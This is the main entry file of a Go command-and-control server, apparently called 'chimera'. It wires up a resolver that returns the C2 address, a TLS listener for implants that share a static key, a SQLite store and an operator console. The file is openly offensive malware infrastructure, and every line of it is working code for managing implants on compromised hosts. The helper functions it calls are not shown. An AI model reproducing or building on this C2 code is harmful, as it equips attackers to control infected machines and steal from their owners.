package main

import (
	"flag"
	"fmt"
	"log"
	"net/http"
)

func main() {
	resolverAddr := flag.String("resolver", ":8080", "resolver listen address")
	c2URL := flag.String("c2-url", "https://localhost:8443", "C2 address returned by resolver")
	c2Addr := flag.String("c2", ":8443", "C2 listener address")
	certFile := flag.String("cert", "server.crt", "TLS certificate file")
	keyFile := flag.String("key", "server.key", "TLS key file")
	staticKeyFile := flag.String("static-key", "static.key", "static key file (hex)")
	dbPath := flag.String("db", "chimera.db", "SQLite database path")
	flag.Parse()

	// Open database
	if err := openDB(*dbPath); err != nil {
		log.Fatalf("[server] failed to open database: %v", err)
	}
	log.Println("[server] database opened")

	// Load static key (must match the implant)
	if err := loadStaticKey(*staticKeyFile); err != nil {
		log.Fatalf("[server] failed to load static key: %v", err)
	}
	log.Println("[server] static key loaded")

	// --- Resolver endpoint ---
	resolverMux := http.NewServeMux()
	resolverMux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/" {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "text/plain")
		fmt.Fprint(w, *c2URL)
	})

	go func() {
		log.Printf("[resolver] listening on %s", *resolverAddr)
		if err := http.ListenAndServe(*resolverAddr, resolverMux); err != nil {
			log.Fatalf("[resolver] %v", err)
		}
	}()

	// --- C2 listener ---
	go startListener(*c2Addr, *certFile, *keyFile)

	// --- Operator CLI (blocks main) ---
	startCLI()
}
